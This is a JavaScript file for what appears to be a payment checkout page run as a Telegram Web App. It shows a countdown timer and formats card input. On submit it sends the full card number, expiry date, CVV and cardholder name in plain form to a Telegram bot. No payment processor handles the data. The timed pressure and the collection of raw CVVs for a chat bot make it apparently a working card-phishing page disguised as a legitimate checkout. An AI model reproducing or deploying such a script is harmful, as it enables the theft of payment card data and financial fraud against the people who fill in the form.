// script.js
document.addEventListener('DOMContentLoaded', function () {
    // --- Elements ---
    const countdownElement = document.getElementById('countdown');
    const amountValueElement = document.getElementById('amountValue');
    const paymentIdElement = document.getElementById('paymentId');
    const payAmountElement = document.getElementById('payAmount');
    const cardNumberInput = document.getElementById('cardNumber');
    const expiryInput = document.getElementById('expiry');
    const cvvInput = document.getElementById('cvv');
    const cardHolderInput = document.getElementById('cardHolder');
    const paymentForm = document.getElementById('paymentForm');

    // --- Get URL Parameters ---
    const urlParams = new URLSearchParams(window.location.search);
    const transactionId = urlParams.get('transaction_id');
    const amount = urlParams.get('amount');
    const paymentId = urlParams.get('payment_id');

    // --- Initialize Page Data ---
    if (amount) {
        amountValueElement.textContent = parseFloat(amount).toFixed(2);
        payAmountElement.textContent = `${parseFloat(amount).toFixed(2)} USD`;
    }
    if (paymentId) {
        paymentIdElement.textContent = paymentId;
    }

    // --- Countdown Timer ---
    let totalSeconds = 29 * 60 + 4; // 29 minutes and 4 seconds

    function updateCountdown() {
        const minutes = Math.floor(totalSeconds / 60).toString().padStart(2, '0');
        const seconds = (totalSeconds % 60).toString().padStart(2, '0');
        countdownElement.textContent = `${minutes}:${seconds}`;

        if (totalSeconds > 0) {
            totalSeconds--;
        } else {
            countdownElement.textContent = "00:00";
            paymentForm.querySelector('button[type="submit"]').disabled = true;
            paymentForm.innerHTML += `<p style="color:red; text-align:center;">Session expired. Please restart the payment.</p>`;
        }
    }

    // Update every second
    const timerInterval = setInterval(updateCountdown, 1000);

    // --- Card Number Formatting ---
    cardNumberInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        let formattedValue = '';
        for (let i = 0; i < value.length; i++) {
            if (i > 0 && i % 4 === 0) {
                formattedValue += ' ';
            }
            formattedValue += value[i];
        }
        e.target.value = formattedValue.substring(0, 19);
    });

    // --- Expiry Date Formatting (MM/YY) ---
    expiryInput.addEventListener('input', function (e) {
        let value = e.target.value.replace(/\D/g, '');
        if (value.length >= 2) {
            value = value.substring(0, 2) + '/' + value.substring(2, 4);
        }
        e.target.value = value.substring(0, 5); // Max MM/YY
    });

    // --- Form Submission ---
    paymentForm.addEventListener('submit', function (e) {
        e.preventDefault();

        // Basic validation (you can add more)
        if (!cardNumberInput.value || !expiryInput.value || !cvvInput.value || !cardHolderInput.value) {
            alert('Please fill in all fields.');
            return;
        }

        // Prepare data to send back to the bot
        const formData = {
            transaction_id: transactionId,
            amount: amount,
            payment_id: paymentId,
            cardNumber: cardNumberInput.value,
            expiry: expiryInput.value,
            cvv: cvvInput.value,
            cardHolder: cardHolderInput.value
        };

        // Use Telegram Web App API to send data
        if (window.Telegram && window.Telegram.WebApp) {
            const tg = window.Telegram.WebApp;
            tg.sendData(JSON.stringify(formData));
            // Close the WebApp after sending
            tg.close();
        } else {
            console.error("Telegram Web App API not found.");
            alert("Unable to submit payment. Please try again.");
        }
    });
});